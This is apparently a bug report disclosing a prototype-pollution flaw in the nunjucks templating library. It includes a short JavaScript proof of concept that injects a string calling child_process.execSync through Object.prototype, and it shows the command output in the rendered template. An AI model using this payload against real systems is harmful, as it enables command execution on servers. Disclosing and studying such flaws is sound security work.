Security bug about prototype pollution
This is a security bug. The current version of nunjucks can be attacked by prototype pollution.
What I expected is`this is payload2  content is  function(){ return global.process.mainModule.require('child_process').execSync('ls') }()  `, but the function returns `this is payload2   content is main.js node_modules package.json yarn.lock`.

Closes #1330 .

Environment
> Mac os 10.15.7
 Nodejs 12.18.1
nunjucks 3.2.2

The sample code is as follows.
```javascript
const nunjucks = require("nunjucks");

nunjucks.configure({
  autoescape: true,
});

const template = nunjucks.compile(" content is {{ content }} ");

const payload = { };

payload.__proto__.content =
  " function(){ return global.process.mainModule.require('child_process').execSync('whoami') }() ";

console.log("this is payload2 ", template.render(payload));
```
![image](https://user-images.githubusercontent.com/42082890/100094205-9cc29480-2e93-11eb-8365-6b2d191de84e.png)
